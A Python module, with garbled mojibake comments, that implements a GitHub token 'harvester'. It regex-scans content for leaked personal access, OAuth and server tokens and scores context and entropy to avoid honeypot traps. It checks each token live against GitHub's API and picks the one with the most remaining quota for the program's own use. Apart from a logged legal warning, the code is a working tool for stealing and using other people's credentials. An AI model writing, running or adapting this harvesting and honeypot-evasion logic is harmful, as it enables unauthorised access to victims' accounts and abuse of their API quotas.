"""
Tokenæ”¶é›†å™¨æ¨¡å— - è‡ªåŠ¨å‘ç°å’ŒéªŒè¯GitHub tokens
å¯é€šè¿‡ç¯å¢ƒå˜é‡é…ç½®æ˜¯å¦å¯ç”¨
"""

import os
import re
import time
import asyncio
import hashlib
import logging
from typing import List, Dict, Any, Optional, Set
from datetime import datetime, timedelta
from dataclasses import dataclass, field
import requests
from enum import Enum

logger = logging.getLogger(__name__)


class TokenRiskLevel(Enum):
    """Tokené£é™©ç­‰çº§"""
    TRUSTED = 0      # è‡ªå·±çš„tokens
    LOW = 1          # ä½é£é™©
    MEDIUM = 2       # ä¸­ç­‰é£é™©
    HIGH = 3         # é«˜é£é™©
    CRITICAL = 4     # æé«˜é£é™©
    BLACKLISTED = 5  # é»‘åå•


@dataclass
class DiscoveredToken:
    """å‘ç°çš„Token"""
    token: str
    source_url: str
    discovered_at: datetime
    risk_level: TokenRiskLevel = TokenRiskLevel.HIGH
    remaining_quota: int = 0
    is_valid: bool = False
    validation_attempts: int = 0
    last_validation: Optional[datetime] = None
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    @property
    def masked_token(self) -> str:
        """è¿”å›æ©ç åçš„token"""
        if len(self.token) > 10:
            return f"{self.token[:7]}...{self.token[-4:]}"
        return "***"
    
    @property
    def token_hash(self) -> str:
        """è¿”å›tokençš„å“ˆå¸Œå€¼ï¼ˆç”¨äºå»é‡ï¼‰"""
        return hashlib.sha256(self.token.encode()).hexdigest()[:16]


class TokenHarvester:
    """
    Tokenæ”¶é›†å™¨ - è‡ªåŠ¨å‘ç°ã€éªŒè¯å’Œç®¡ç†GitHub tokens
    é€šè¿‡ç¯å¢ƒå˜é‡æ§åˆ¶åŠŸèƒ½å¼€å…³
    """
    
    # GitHub tokenæ­£åˆ™æ¨¡å¼
    TOKEN_PATTERNS = [
        r'ghp_[a-zA-Z0-9]{36}',                          # Personal access token
        r'github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}',   # Fine-grained PAT
        r'gho_[a-zA-Z0-9]{36}',                          # OAuth token
        r'ghs_[a-zA-Z0-9]{36}',                          # Server token
    ]
    
    # èœœç½æ£€æµ‹æ¨¡å¼
    HONEYPOT_INDICATORS = [
        'honeypot', 'honey_pot', 'trap', 'fake', 'test', 'demo',
        'example', 'sample', 'dummy', 'placeholder', 'xxx'
    ]
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        åˆå§‹åŒ–Tokenæ”¶é›†å™¨
        
        Args:
            config: é…ç½®å­—å…¸
        """
        self.config = config or self._load_config()
        
        # åŠŸèƒ½å¼€å…³ï¼ˆä»ç¯å¢ƒå˜é‡è¯»å–ï¼‰
        self.enabled = self._is_feature_enabled()
        
        # å®‰å…¨é…ç½®
        self.risk_threshold = self.config.get('risk_threshold', TokenRiskLevel.MEDIUM.value)
        self.max_validation_attempts = self.config.get('max_validation_attempts', 3)
        self.validation_cooldown = self.config.get('validation_cooldown', 300)  # 5åˆ†é’Ÿ
        
        # Tokenæ± 
        self.discovered_tokens: Dict[str, DiscoveredToken] = {}  # hash -> token
        self.validated_tokens: List[DiscoveredToken] = []
        self.blacklisted_hashes: Set[str] = set()
        
        # ç»Ÿè®¡
        self.stats = {
            'total_discovered': 0,
            'total_validated': 0,
            'total_added': 0,
            'total_rejected': 0,
            'honeypots_detected': 0
        }
        
        if self.enabled:
            logger.info("ğŸ” TokenHarvester enabled - will auto-discover tokens")
            logger.warning("âš ï¸ WARNING: This feature should only be used in compliance with applicable laws and terms of service")
        else:
            logger.info("ğŸ”’ TokenHarvester disabled - using only configured tokens")
    
    def _load_config(self) -> Dict[str, Any]:
        """åŠ è½½é…ç½®"""
        return {
            'enabled': os.getenv('CREDENTIAL_AUTO_HARVEST', 'false').lower() == 'true',
            'risk_threshold': int(os.getenv('CREDENTIAL_HARVEST_RISK_THRESHOLD', '2')),
            'validate_discovered': os.getenv('CREDENTIAL_VALIDATE_DISCOVERED', 'true').lower() == 'true',
            'max_discovered_tokens': int(os.getenv('CREDENTIAL_MAX_DISCOVERED', '10')),
            'sandbox_validation': os.getenv('CREDENTIAL_SANDBOX_VALIDATION', 'true').lower() == 'true',
            'honeypot_detection': os.getenv('CREDENTIAL_HONEYPOT_DETECTION', 'true').lower() == 'true',
        }
    
    def _is_feature_enabled(self) -> bool:
        """æ£€æŸ¥åŠŸèƒ½æ˜¯å¦å¯ç”¨"""
        # å¤šé‡æ£€æŸ¥ç¡®ä¿å®‰å…¨
        if not self.config.get('enabled', False):
            return False
        
        # æ£€æŸ¥æ˜¯å¦åœ¨ç”Ÿäº§ç¯å¢ƒï¼ˆç”Ÿäº§ç¯å¢ƒé»˜è®¤ç¦ç”¨ï¼‰
        if os.getenv('ENVIRONMENT', 'development') == 'production':
            # ç”Ÿäº§ç¯å¢ƒéœ€è¦æ˜¾å¼å¯ç”¨
            if os.getenv('CREDENTIAL_HARVEST_PRODUCTION', 'false').lower() != 'true':
                logger.warning("âš ï¸ Token harvesting disabled in production (set CREDENTIAL_HARVEST_PRODUCTION=true to override)")
                return False
        
        return True
    
    def extract_tokens_from_content(self, content: str, source_url: str = "") -> List[DiscoveredToken]:
        """
        ä»å†…å®¹ä¸­æå–GitHub tokens
        
        Args:
            content: è¦æ‰«æçš„å†…å®¹
            source_url: å†…å®¹æ¥æºURL
            
        Returns:
            å‘ç°çš„tokensåˆ—è¡¨
        """
        if not self.enabled:
            return []
        
        discovered = []
        
        for pattern in self.TOKEN_PATTERNS:
            matches = re.findall(pattern, content)
            
            for token in matches:
                # è®¡ç®—å“ˆå¸Œç”¨äºå»é‡
                token_hash = hashlib.sha256(token.encode()).hexdigest()[:16]
                
                # è·³è¿‡å·²çŸ¥çš„token
                if token_hash in self.discovered_tokens or token_hash in self.blacklisted_hashes:
                    continue
                
                # åˆæ­¥é£é™©è¯„ä¼°
                risk_level = self._assess_initial_risk(token, content, source_url)
                
                # åˆ›å»ºDiscoveredTokenå¯¹è±¡
                discovered_token = DiscoveredToken(
                    token=token,
                    source_url=source_url,
                    discovered_at=datetime.now(),
                    risk_level=risk_level,
                    metadata={
                        'pattern': pattern,
                        'context': self._extract_context(content, token)
                    }
                )
                
                # æ£€æŸ¥æ˜¯å¦ä¸ºèœœç½
                if self.config.get('honeypot_detection') and self._is_honeypot(discovered_token):
                    logger.warning(f"ğŸ¯ Potential honeypot detected: {discovered_token.masked_token}")
                    self.stats['honeypots_detected'] += 1
                    self.blacklisted_hashes.add(token_hash)
                    continue
                
                discovered.append(discovered_token)
                self.discovered_tokens[token_hash] = discovered_token
                self.stats['total_discovered'] += 1
        
        if discovered:
            logger.info(f"ğŸ” Discovered {len(discovered)} potential tokens from {source_url}")
        
        return discovered
    
    def _assess_initial_risk(self, token: str, content: str, source_url: str) -> TokenRiskLevel:
        """åˆæ­¥é£é™©è¯„ä¼°"""
        risk_score = 0
        
        # æ£€æŸ¥æ¥æº
        suspicious_domains = ['honeypot', 'trap', 'test', 'demo', 'example']
        for domain in suspicious_domains:
            if domain in source_url.lower():
                risk_score += 3
        
        # æ£€æŸ¥ä¸Šä¸‹æ–‡
        context = content[max(0, content.find(token) - 100):content.find(token) + 100]
        for indicator in self.HONEYPOT_INDICATORS:
            if indicator in context.lower():
                risk_score += 2
        
        # æ£€æŸ¥tokenç†µå€¼
        entropy = self._calculate_entropy(token)
        if entropy < 3.0 or entropy > 5.5:
            risk_score += 1
        
        # è½¬æ¢ä¸ºé£é™©ç­‰çº§
        if risk_score >= 7:
            return TokenRiskLevel.CRITICAL
        elif risk_score >= 5:
            return TokenRiskLevel.HIGH
        elif risk_score >= 3:
            return TokenRiskLevel.MEDIUM
        elif risk_score >= 1:
            return TokenRiskLevel.LOW
        else:
            return TokenRiskLevel.LOW
    
    def _calculate_entropy(self, token: str) -> float:
        """è®¡ç®—Shannonç†µ"""
        import math
        from collections import Counter
        
        if not token:
            return 0
        
        counter = Counter(token)
        length = len(token)
        entropy = 0
        
        for count in counter.values():
            probability = count / length
            if probability > 0:
                entropy -= probability * math.log2(probability)
        
        return entropy
    
    def _extract_context(self, content: str, token: str, context_size: int = 200) -> str:
        """æå–tokenå‘¨å›´çš„ä¸Šä¸‹æ–‡"""
        index = content.find(token)
        if index == -1:
            return ""
        
        start = max(0, index - context_size // 2)
        end = min(len(content), index + len(token) + context_size // 2)
        
        context = content[start:end]
        # æ›¿æ¢tokenä¸ºæ©ç 
        context = context.replace(token, "[TOKEN]")
        
        return context
    
    def _is_honeypot(self, discovered_token: DiscoveredToken) -> bool:
        """æ£€æµ‹æ˜¯å¦ä¸ºèœœç½token"""
        # æ£€æŸ¥ä¸Šä¸‹æ–‡ä¸­çš„èœœç½æŒ‡ç¤ºå™¨
        context = discovered_token.metadata.get('context', '').lower()
        honeypot_score = 0
        
        for indicator in self.HONEYPOT_INDICATORS:
            if indicator in context:
                honeypot_score += 1
        
        # æ£€æŸ¥tokenæœ¬èº«çš„ç‰¹å¾
        token = discovered_token.token
        
        # é‡å¤å­—ç¬¦æ£€æµ‹
        if any(char * 5 in token for char in '0123456789abcdef'):
            honeypot_score += 2
        
        # ç†µå€¼å¼‚å¸¸
        entropy = self._calculate_entropy(token)
        if entropy < 2.5:  # ç†µå€¼å¤ªä½
            honeypot_score += 2
        
        return honeypot_score >= 3
    
    async def validate_token(self, discovered_token: DiscoveredToken) -> bool:
        """
        éªŒè¯å‘ç°çš„token
        
        Args:
            discovered_token: è¦éªŒè¯çš„token
            
        Returns:
            æ˜¯å¦æœ‰æ•ˆ
        """
        if not self.enabled or not self.config.get('validate_discovered', True):
            return False
        
        # æ£€æŸ¥éªŒè¯å†·å´æ—¶é—´
        if discovered_token.last_validation:
            cooldown_end = discovered_token.last_validation + timedelta(seconds=self.validation_cooldown)
            if datetime.now() < cooldown_end:
                logger.debug(f"Token {discovered_token.masked_token} in validation cooldown")
                return False
        
        # æ£€æŸ¥éªŒè¯æ¬¡æ•°
        if discovered_token.validation_attempts >= self.max_validation_attempts:
            logger.debug(f"Token {discovered_token.masked_token} exceeded max validation attempts")
            return False
        
        discovered_token.validation_attempts += 1
        discovered_token.last_validation = datetime.now()
        
        try:
            # ä½¿ç”¨æ²™ç®±éªŒè¯ï¼ˆå¦‚æœå¯ç”¨ï¼‰
            if self.config.get('sandbox_validation', True):
                return await self._sandbox_validate(discovered_token)
            else:
                return await self._direct_validate(discovered_token)
                
        except Exception as e:
            logger.error(f"Token validation error: {e}")
            return False
    
    async def _sandbox_validate(self, discovered_token: DiscoveredToken) -> bool:
        """æ²™ç®±ç¯å¢ƒéªŒè¯ï¼ˆæ›´å®‰å…¨ï¼‰"""
        try:
            # åªä½¿ç”¨åªè¯»APIè¿›è¡ŒéªŒè¯
            headers = {
                "Authorization": f"token {discovered_token.token}",
                "Accept": "application/vnd.github.v3+json"
            }
            
            # ä½¿ç”¨rate_limitç«¯ç‚¹ï¼ˆåªè¯»ï¼Œå®‰å…¨ï¼‰
            response = requests.get(
                "https://api.github.com/rate_limit",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                remaining = data.get('rate', {}).get('remaining', 0)
                
                discovered_token.remaining_quota = remaining
                discovered_token.is_valid = True
                
                # åªæ¥å—æœ‰è¶³å¤Ÿé…é¢çš„token
                if remaining > 1000:  # è‡³å°‘1000æ¬¡å‰©ä½™
                    self.validated_tokens.append(discovered_token)
                    self.stats['total_validated'] += 1
                    logger.info(f"âœ… Validated token with {remaining} remaining quota")
                    return True
                else:
                    logger.info(f"âš ï¸ Token valid but low quota: {remaining}")
                    
            elif response.status_code == 401:
                # æ— æ•ˆtoken
                discovered_token.is_valid = False
                self.blacklisted_hashes.add(discovered_token.token_hash)
                
        except Exception as e:
            logger.debug(f"Sandbox validation failed: {e}")
        
        return False
    
    async def _direct_validate(self, discovered_token: DiscoveredToken) -> bool:
        """ç›´æ¥éªŒè¯ï¼ˆé£é™©è¾ƒé«˜ï¼‰"""
        # ä¸æ¨èä½¿ç”¨ï¼Œä»…ä½œä¸ºå¤‡é€‰
        logger.warning("âš ï¸ Direct validation not recommended for discovered tokens")
        return False
    
    def get_best_discovered_token(self) -> Optional[DiscoveredToken]:
        """è·å–æœ€ä½³çš„å·²å‘ç°token"""
        if not self.enabled or not self.validated_tokens:
            return None
        
        # è¿‡æ»¤é£é™©ç­‰çº§
        acceptable_tokens = [
            t for t in self.validated_tokens
            if t.risk_level.value <= self.risk_threshold
            and t.remaining_quota > 100
        ]
        
        if not acceptable_tokens:
            return None
        
        # æŒ‰å‰©ä½™é…é¢æ’åº
        acceptable_tokens.sort(key=lambda t: t.remaining_quota, reverse=True)
        
        return acceptable_tokens[0]
    
    def should_use_discovered_token(self) -> bool:
        """å†³å®šæ˜¯å¦åº”è¯¥ä½¿ç”¨å‘ç°çš„token"""
        if not self.enabled:
            return False
        
        # æ£€æŸ¥æ˜¯å¦æœ‰å¯ç”¨çš„å·²éªŒè¯token
        if not self.validated_tokens:
            return False
        
        # æ£€æŸ¥æ˜¯å¦è¾¾åˆ°æœ€å¤§ä½¿ç”¨æ•°é‡
        max_discovered = self.config.get('max_discovered_tokens', 10)
        if len(self.validated_tokens) > max_discovered:
            return False
        
        return True
    
    def get_statistics(self) -> Dict[str, Any]:
        """è·å–ç»Ÿè®¡ä¿¡æ¯"""
        return {
            'enabled': self.enabled,
            'stats': self.stats.copy(),
            'discovered_count': len(self.discovered_tokens),
            'validated_count': len(self.validated_tokens),
            'blacklisted_count': len(self.blacklisted_hashes),
            'risk_threshold': self.risk_threshold
        }
    
    def cleanup_expired_tokens(self):
        """æ¸…ç†è¿‡æœŸçš„å‘ç°tokens"""
        if not self.enabled:
            return
        
        # ç§»é™¤éªŒè¯å¤±è´¥æ¬¡æ•°è¿‡å¤šçš„
        self.validated_tokens = [
            t for t in self.validated_tokens
            if t.validation_attempts < self.max_validation_attempts
        ]
        
        # ç§»é™¤å¤ªæ—§çš„å‘ç°tokensï¼ˆ24å°æ—¶ï¼‰
        cutoff_time = datetime.now() - timedelta(hours=24)
        
        expired_hashes = []
        for token_hash, token in self.discovered_tokens.items():
            if token.discovered_at < cutoff_time:
                expired_hashes.append(token_hash)
        
        for token_hash in expired_hashes:
            del self.discovered_tokens[token_hash]
        
        if expired_hashes:
            logger.info(f"ğŸ§¹ Cleaned up {len(expired_hashes)} expired discovered tokens")


# å…¨å±€å®ä¾‹
_harvester_instance: Optional[TokenHarvester] = None


def get_token_harvester(config: Optional[Dict[str, Any]] = None) -> TokenHarvester:
    """è·å–å…¨å±€TokenHarvesterå®ä¾‹"""
    global _harvester_instance
    if _harvester_instance is None:
        _harvester_instance = TokenHarvester(config)
    return _harvester_instance